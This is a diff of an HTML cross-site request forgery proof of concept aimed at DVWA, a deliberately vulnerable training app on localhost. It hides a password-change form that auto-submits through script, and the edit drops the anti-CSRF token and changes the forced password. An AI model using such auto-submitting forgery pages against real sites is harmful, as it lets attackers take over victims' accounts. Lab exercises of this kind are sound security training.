@@ -8,11 +8,10 @@
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/">
-      <input type="hidden" name="password&#95;new" value="123456" />
-      <input type="hidden" name="password&#95;conf" value="123456" />
+      <input type="hidden" name="password&#95;new" value="1234" />
+      <input type="hidden" name="password&#95;conf" value="1234" />
       <input type="hidden" name="Change" value="Change" />
-      <input type="hidden" name="user&#95;token" value="ca139acd857efe87f98994c515b2d499" />
-      <input type="submit" value="Submit request" id="onclick_1" />
+      <input type="submit" value="Submit request" />
     </form>
     <script type="text/javascript">
       document.getElementById("onclick_1").click();
